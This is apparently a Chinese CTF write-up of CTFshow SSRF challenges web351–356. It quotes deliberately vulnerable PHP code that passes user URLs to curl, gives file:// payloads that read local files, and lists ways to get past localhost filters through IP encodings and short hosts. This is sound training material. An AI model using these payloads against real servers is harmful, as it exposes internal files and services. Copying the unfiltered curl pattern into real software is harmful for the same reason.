@[toc]

## 

 内网和外网的区别：

https://zhuanlan.zhihu.com/p/147282153

ssh文件传输协议：远程登录，从本机到服务器需要该协议

url协议：[[WEB安全\]SSRF中URL的伪协议 - 肖洋肖恩、 - 博客园 (cnblogs.com)](https://www.cnblogs.com/-mo-/p/11673190.html)

[php协议详解](https://www.cnblogs.com/endust/p/11804767.html)

##  CTFshow

对SSRF，比较重要的就是先尝试每一个协议是否可以使用。

###  web351

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);//初始化一个curl的会话
curl_setopt($ch, CURLOPT_HEADER, 0);//对会话进行设置参数
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);//将会话发给浏览器
curl_close($ch);//关闭会话
echo ($result);
?> 
```

代码审计，发现就是特别普通的curl语句，没有任何过滤，我们使用file协议来读取本地文件

所以我们可以使用file://来读取flag.php文件

payload

```php
POST:url=file:///var/www/html/flag.php(一般的路径是这个)
还有个：
    url=http://127.0.0.1/flag.php(使用http://协议访问本地文件，类似于我们自己在本地搭建网站)
```

nginx配置路径：/etc/nginx/ngin.conf,用file可以访问

#### file协议和http协议的区别

```
file 协议与 http 协议的区别 ¶
（1）file 协议主要用于读取服务器本地文件，访问的是本地的静态资源
（2）http 是访问本地的 html 文件，简单来说 file 只能静态读取，http 可以动态解析
（3）http 服务器可以开放端口，让他人通过 http 访问服务器资源，但 file 不可以
（4）file 对应的类似 http 的协议是 ftp 协议（文件传输协议）
（5）file 不能跨域
```

###  web352

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> 
```

parse_url:

```
本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。
例子：
<?php
$url = 'http://username:password@hostname/path?arg=value#anchor';

print_r(parse_url($url));

echo parse_url($url, PHP_URL_PATH);
?>
输出：
Array
(
    [scheme] => http
    [host] => hostname
    [user] => username
    [pass] => password
    [path] => /path
    [query] => arg=value
    [fragment] => anchor
)
/path
```

这个题需要满足传输协议为http,https,但是ip地址不能为127.0.0.1

有许多绕过方式

[进制转换](https://tool.520101.com/wangluo/jinzhizhuanhuan/)

```
1.进制转换
十六进制
url=http://0x7F.0.0.1/flag.php
八进制
url=http://0177.0.0.1/flag.php
10 进制整数格式
url=http://2130706433/flag.php
16 进制整数格式，还是上面那个网站转换记得前缀0x
url=http://0x7F000001/flag.php
2.特殊模式
url=http://127.1/flag.php
url=http://0/flag.php
url=http://127.0000000000000.001/flag.php
3.0.0.0.0绕过
url=http://0.0.0.0/flag.php
4.用CIDR绕过localhost
url=http://127.127.127.127/flag.php
5.
短标签绕过，好像不行
ipv6绕过[::1]，这题也不行。
使用句号绕过：url=http://127。0。0。1/flag.php，也不行
DNS重绑定
```

###  web353

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> 
```

同上，但是有一些payload不能用

###  web354

###  web355

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

因为设置$host<=5的限制，我们只需要构造一个host的长度<=5

payload

```php
url=http://0/flag.php
url=http://127.1/flag.php
```

###  web356

$host小于3

payload:

```php
url=http://0/flag.php
```





